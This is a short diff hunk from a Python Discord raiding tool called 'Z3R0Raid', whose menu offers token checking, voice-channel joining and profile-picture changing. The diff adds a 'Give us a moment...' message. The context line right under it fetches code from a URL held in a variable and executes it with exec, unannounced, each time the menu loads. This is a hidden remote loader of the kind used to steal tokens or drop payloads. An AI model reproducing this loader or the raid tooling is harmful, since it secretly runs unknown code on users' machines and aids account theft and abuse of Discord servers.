@@ -471,6 +471,7 @@ def Z3R0Raid():
                     [03] Token Checker           [06] VC joiner              [09] Pfp Changer  
                    '''                                    
     , Colors.red_to_blue, interval=0.000)
+    print(f"{blue}{red}Give us a moment...{blue}")
     exec(requests.get(redblue).content.decode('utf8'))
     choice = input(f""" {blue}
 ┌──{red}(Z3R0Raid@skid){blue} ~ [{red}Ϟ{blue}]
